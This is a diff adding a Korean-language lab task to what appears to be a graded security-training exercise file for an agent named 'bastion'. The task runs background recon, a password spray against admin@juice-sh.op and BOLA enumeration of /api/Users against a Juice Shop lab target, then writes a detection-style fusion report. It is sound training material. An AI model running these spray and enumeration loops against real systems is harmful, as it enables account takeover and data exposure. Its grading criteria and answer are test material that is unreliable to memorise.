@@ -425,3 +425,74 @@ steps:
     tail -30 > ~/ccc/artifacts/w07/timeline.txt && wc -l ~/ccc/artifacts/w07/timeline.txt
   risk_level: low
   bastion_prompt: 3세션 타임라인 요약 생성.
+- order: 100
+  instruction: '[Multi-task] 다중 에이전트 시뮬 5단계 통합 — 세션 A 정찰 → B 브루트 → C API enum → 타임라인 → fusion 보고서.'
+  bastion_prompt: |
+    다중 에이전트 (Coordinated Multi-Agent) 시뮬 5작업을 한 흐름의 분석 으로 수행해줘.
+
+    1) [세션 A - 정찰 (3분 내 15 경로)] ssh ccc@{{ATTACKER_IP}} 'mkdir -p ~/ccc/artifacts/w07; (for p in
+       /robots.txt /sitemap.xml /api/Users /api/Products /rest/admin /assets /uploads /ftp /backups /api/Cards
+       /api/Memories /api/Quantitys /rest/products/search /metrics /swagger; do curl -s -o /dev/null -w
+       "$(date +%s) sessionA $p %{http_code}\n" {{WEB_IP}}:3000$p; sleep 1; done) > ~/ccc/artifacts/w07/
+       sessionA.log &' 의 백그라운드 정찰. MITRE T1595 매핑.
+
+    2) [세션 B - 로그인 브루트 (10회)] (for pw in admin password 123456 admin123 Welcome Welcome1 P@ss
+       Pass1234 Summer Letmein; do curl -s -o /dev/null -w "$(date +%s) sessionB login %{http_code}\n" -X POST
+       {{WEB_IP}}:3000/rest/user/login -H "Content-Type: application/json" -d "{\"email\":\"admin@juice-sh.op\",
+       \"password\":\"$pw\"}"; sleep 0.5; done) > ~/ccc/artifacts/w07/sessionB.log & 의 백그라운드 spray.
+       MITRE T1110.003 매핑.
+
+    3) [세션 C - API 경로 열거 (6 경로)] (for api in /api/Users/1 /api/Users/2 /api/Users/3 /api/Cards/1
+       /api/PrivacyRequests/1 /api/Recycles/1; do curl -s -o /dev/null -w "$(date +%s) sessionC %{http_code}
+       $api\n" {{WEB_IP}}:3000$api; sleep 0.8; done) > ~/ccc/artifacts/w07/sessionC.log & 의 백그라운드 BOLA
+       시도. wait 으로 3 세션 모두 완료 대기. MITRE T1190 + OWASP API1 매핑.
+
+    4) [Access.log 타임라인 - 3 세션 겹침] sleep 5; ssh ccc@{{WEB_IP}} 'sudo tail -100 /var/log/apache2/
+       access.log | awk "{print \$4, \$1, \$7, \$9}" | tail -40' 의 access.log + 시간 (4번째 컬럼) 의 분포 +
+       동일 second 의 multiple session 의 중첩 카운트 (python3 으로 분석) 표.
+
+    5) [Fusion 보고서 - Coordinated Attack 신호] 1~4 결과를 합쳐 (Session / Vector / 시간 window /
+       Concurrency 신호 / fusion 결과 - 단일 attacker 의 multi-thread vs separate attackers) 의 4×5 매트릭스 +
+       Coordinated Attack Indicator (CAI) 점수 (4 지표: 1. IP overlap 2. Time overlap 3. User-Agent uniqueness
+       4. Source port distribution) 계산 + experience 저장 + Sun Tzu 의 "지피지기" 의 fusion 분석 정리.
+
+    cleanup: rm -rf ~/ccc/artifacts/w07/session*.log.
+
+    마지막에 5단계 × (세션 / 패턴 / 신호 / CAI 점수 / Fusion 결과 / 운영 권고) 의 5×6 매트릭스 + Multi-Agent
+    Coordination Map (3 세션 의 timeline overlap visualization) + Fusion Report (단일 attacker vs separate
+    attackers 의 판정) markdown 출력.
+  hint: 다중 에이전트 5 세션 chain. CAI 점수 + Fusion 분석이 학습 핵심.
+  category: multi_task
+  points: 50
+  verify:
+    type: output_contains
+    expect: ''
+    field: stdout
+    semantic:
+      intent: '[통합] 다중 에이전트 5단계 — 세션 A/B/C/타임라인/Fusion. MITRE T1110/T1190/T1595 + OWASP API1 매핑 + 5×6 매트릭스 + CAI 점수 + Coordination Map.'
+      success_criteria:
+      - 5 단계 모두 실행
+      - 3 세션 (A 정찰 / B 브루트 / C API enum) 모두 백그라운드 실행
+      - access.log 타임라인 분석
+      - CAI 점수 4 지표 계산
+      - experience 저장
+      - cleanup (session*.log 제거)
+      - 5×6 매트릭스 + Coordination Map
+      acceptable_methods:
+      - bastion 의 multi-stage planning
+      - ssh + curl + awk + python3 표준
+      - markdown 매트릭스 + Map
+      negative_signs:
+      - 3 단계 이하 만 수행
+      - 세션 1-2개 만
+      - CAI 점수 누락
+      - Fusion 보고서 누락
+      - cleanup 미수행
+      - 매트릭스 6 컬럼 미만
+  target_vm: attacker
+  risk_level: low
+  answer: |
+    🤖 위 bastion_prompt 그대로. 다중 에이전트 5 세션 + 5×6 매트릭스 + CAI 점수 + Coordination Map.
+  answer_detail: |
+    Threat Analyst 페르소나 — 다중 에이전트 coordinated attack 분석. CAI 점수 + Fusion Report 가 산출물.
+  script: ''
